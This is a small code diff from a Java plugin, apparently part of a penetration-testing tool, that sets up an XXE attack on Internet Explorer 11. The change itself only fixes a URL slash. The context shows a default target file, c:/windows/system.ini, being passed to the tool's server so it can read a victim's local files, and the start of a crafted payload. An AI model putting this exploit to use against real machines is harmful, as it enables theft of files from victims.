@@ -48,7 +48,7 @@ public class IE11XXE extends MVCPlugin{
     public void gen(){
 
         String file = param.getOrDefault("file","c:/windows/system.ini").toString();
-        String xmlurl = trackrayURL+"/plugin/mvc/ie11XXE/data.xml?file="+file;
+        String xmlurl = trackrayURL+"plugin/mvc/ie11XXE/data.xml?file="+file;
 
         String payload = "From:\n" +
                 "Subject:\n" +
